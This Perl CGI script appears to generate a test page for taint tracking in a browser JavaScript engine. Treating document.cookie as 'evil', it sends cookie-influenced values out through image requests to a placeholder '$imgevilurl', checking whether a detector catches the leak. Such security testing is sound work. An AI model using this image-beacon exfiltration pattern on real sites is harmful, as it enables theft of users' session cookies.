#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_THIS";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 42;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;
		
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 

		var a = { 
		  x : 12, 
		  test : function () { 
			return this.x; 
		  }
		}
		dut = a.test();

		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		var b = { 
		  y : 12, 
		  test2 : function () { 
			if ($evil) {
				return this.y; 
			}
		  }
		}
		dut2 = b.test2();
		
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		
		if ($evil) {
			var c = { 
			  z : evil, 
			  test3 : function () { 
				return this.z; 
			  }
			}
		}
		dut3 = c.test3();
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
